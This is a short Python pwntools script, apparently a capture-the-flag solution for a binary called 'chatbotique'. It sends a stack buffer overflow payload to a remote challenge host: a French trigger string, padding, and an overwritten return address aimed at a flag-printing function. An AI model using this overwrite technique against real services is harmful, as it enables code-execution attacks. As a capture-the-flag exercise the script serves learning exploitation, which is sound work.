from pwn import *

exe = ELF("./chatbotique", checksec=False)

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("161.35.21.37", 40013)
    return r

def main():
    r = conn()

    print(r.recv())
    print(r.recv())

    condition = b"Je voudrais le flag\x00"
    junk = b"A" * (0x100 - len(condition))
    rbp = b"B" * 0x8
    rip = p64(0x00401317)

    payload = condition + junk + rbp + rip


    print(payload)

    r.sendline(payload)

    print(r.recvall().decode().split("\n")[2])


if __name__ == "__main__":
    main()